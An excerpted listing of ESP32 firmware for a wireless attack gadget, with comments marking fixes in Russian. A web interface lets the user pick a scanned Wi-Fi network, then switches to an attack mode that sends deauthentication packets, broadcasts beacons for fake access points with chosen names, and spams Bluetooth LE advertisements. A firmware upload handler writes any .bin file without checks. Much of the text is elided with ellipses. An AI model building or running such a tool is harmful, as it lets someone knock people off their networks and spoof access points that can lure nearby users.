...
void sendBLESpam();
void sendFakeAP();void handleScan();
...
<script>
let selN=0;
let dA=false, bA=false, fA=false;
...
// === MODE SWITCHING (ИСПРАВЛЕНО) ===
void switchToWebMode() {
  if (isAttackMode) {    Serial.println("🔄 Switching to Web Mode...");
...
void switchToAttackMode() {
  if (!isAttackMode) {
    Serial.println("⚔️ Switching to Attack Mode...");
    server.stop();
    WiFi.softAPdisconnect(true);
    delay(100);
    
    // ИСПРАВЛЕНО: Режим AP + монитор для отправки пакетов
    WiFi.mode(WIFI_MODE_AP);
...
void loop() {
  ...
  if (digitalRead(BTN_STOP) == LOW) {
    Serial.println("🛑 Button Pressed - Stopping Attack");
    deauthRunning = false;
  ...
  if (!isAttackMode) {
    ...
    if (bleSpamRunning && millis() - lastBlePacket > 100) { 
      lastBlePacket = millis();       sendBLESpam(); 
    }
...
void sendDeauthPacket() {
  ...
  // ИСПРАВЛЕНО: Отправка через WIFI_IF_AP в режиме AP
...
void sendBLESpam() {
  ...
  p->stop();
  delay(20); // ИСПРАВЛЕНО: задержка для стабильности
  uint16_t uuid = 0x1800 + (esp_random() % 0x100);  p->addServiceUUID(BLEUUID(uuid));
  p->setMinPreferred(0x06);
  p->setMaxPreferred(0x12);
  p->start();
...
void sendFakeAP() {
  ...
  // ИСПРАВЛЕНО: Отправка через WIFI_IF_AP
  esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
  Serial.println("📡 Fake AP: " + ssidName);
...
void handleDeauthStart() {  int n = server.arg("n").toInt();
  if (n >= 0 && n < scanCount) {
    targetChannel = scanChannels[n];
    targetSSID = scanSSIDs[n];
    deauthRunning = true;
    switchToAttackMode();
  }
...
void handleFakeAPConfig() {
  ...
  for (int i = 0; i <= names.length() && idx < 6; i++) {
    if (i == names.length() || names.charAt(i) == ',') {
      fakeAPNames[idx++] = names.substring(start, i); start = i + 1;
    }
  }
  fakeAPCount = idx;
  server.send(200, "text/plain", "OK");
...
void handleUpload() {
  ...
  if (u.status == UPLOAD_FILE_START) {
    ...
    if (u.filename.endsWith(".bin")) Update.write(u.buf, u.currentSize);    else if (f) f.write(u.buf, u.currentSize);
